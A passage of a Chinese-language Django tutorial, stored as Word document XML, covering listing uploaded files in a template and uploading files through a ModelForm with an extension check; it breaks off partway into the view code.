    <w:p w14:paraId="22080E63" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;td&gt;Upload Method&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283FD6AA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088B454A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% for file in files %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F18F22A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122C5A10" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        &lt;td&gt;&lt;a href="{{ file.file.url }}"&gt;{{ file.file.url }}&lt;/a&gt;&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A5A685" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;td&gt;{{ file.file.size | filesizeformat }}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020685AC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;td&gt;{{ file.upload_method }}&lt;/td&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FDB97C4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39BF9029" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% endfor %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743119DC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;/tbody&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7FD9DC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C76559C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FB0904A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% else %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D37E1B2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;p&gt;No files uploaded yet. Please click &lt;a href="{% url 'file_upload:file_upload' %}"&gt;here&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3970459C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    to upload files.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA64AA1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C93891E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FD722F6" w14:textId="3989F547" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B652571" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425A0D02" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对于上传的文件我们可以调用file.url, file.name和file.size来查看上传文件的链接，地址和大小。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B1DEF8" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上传文件的大小默认是以B显示的，数字非常大。使用Django模板过滤器filesizeformat可以将文件大小显示为人们可读的方式，如MB，KB。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E86D398" w14:textId="6C93EB4F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文件清单显示效果如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25705FD0" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6318701F" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用ModelForm上传文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7786AC2B" w14:textId="26AA946A" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用ModelForm上传是小编我推荐的上传方式，前提是你已经在模型中通过upload_to选项自定义了用户上传文件存储地址，并对文件进行了重命名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0487DBEB" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们首先要自定义自己的FileUploadModelForm，由模型重建的。代码如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0C883B"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#file_upload/forms.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E747A8B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django import forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BDC6D6" w14:textId="65591C96" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .models import File</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C288A8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="220D4972" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Model form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682E3A02" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class FileUploadModelForm(forms.ModelForm):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FDBE12" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70635A73" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        model = File</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4A2BA0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        fields = ('file', 'upload_method',)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD3EB6F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19344F92" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        widgets = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="730A593E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">            'upload_method': forms.TextInput(attrs={'class': 'form-control'}),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C665319" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            'file': forms.ClearableFileInput(attrs={'class': 'form-control'}),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E463BD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70796009" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B55ED1A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def clean_file(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F485D5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        file = self.cleaned_data['file']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62CA4AC6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ext = file.name.split('.')[-1].lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF54701" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if ext not in ["jpg", "pdf", "xlsx"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4556A764" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise forms.ValidationError("Only jpg, pdf and xlsx files are allowed.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17FAAF4C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        # return cleaned data is very important.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D601EC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD332AC" w14:textId="0723BB53" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="734BD868" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用ModelForm处理文件上传的视图model_form_upload方法非常简单，只需使用form.save()即可，无需再手动编写代码写入文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBA0B83"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#file_upload/views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0572CCAC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import render, redirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D5EC00" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .models import File</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB15EB0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
